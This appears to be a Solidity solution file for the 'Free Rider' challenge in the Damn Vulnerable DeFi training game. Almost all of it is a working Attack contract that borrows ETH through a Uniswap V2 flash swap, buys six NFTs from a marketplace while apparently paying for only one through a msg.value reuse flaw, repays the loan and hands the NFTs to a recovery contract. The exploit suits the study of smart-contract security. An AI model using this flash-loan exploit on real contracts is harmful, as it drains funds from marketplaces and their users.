// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol"; // Import the IERC721 interface
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Attack {
    IUniswapV2Pair public pair;
    // IMarketplace public marketplace;
    FreeRiderNFTMarketplace public marketplace;
    WETH public weth;
    IERC721 public nft;
    address public recoveryContract;
    address public player;
    uint256 private constant NFT_PRICE = 15 ether;
    uint256[] private tokens = [0, 1, 2, 3, 4, 5];

    constructor(
        address payable _pair,
        address payable _nftMarketplace,
        address payable _weth,
        address _nft,
        address _recoveryContract
    ) payable {
        pair = IUniswapV2Pair(_pair);
        marketplace = FreeRiderNFTMarketplace(_nftMarketplace);
        weth = WETH(_weth);
        nft = IERC721(_nft);
        recoveryContract = _recoveryContract;
        player = msg.sender;
    }

    function attack() external payable {
        // Request for 15ETH
        pair.swap(NFT_PRICE, 0, address(this), "0");
    }

    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external  {
        // Access Control
        require(msg.sender == address(pair));
        require(tx.origin == player);

        // Unwrap WETH to native ETH
        weth.withdraw(NFT_PRICE);

        marketplace.buyMany{value: NFT_PRICE}(tokens);
        uint256 amountToPayBack = NFT_PRICE * 1004/1000;
        weth.deposit{value: amountToPayBack}();
        weth.transfer(address(pair), amountToPayBack);

        bytes memory transferData = abi.encode(
            player
        );
        for(uint256 i = 0; i < tokens.length; i++) {
            nft.safeTransferFrom(address(this), recoveryContract, i, transferData);
        }
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() payable external {

    }





}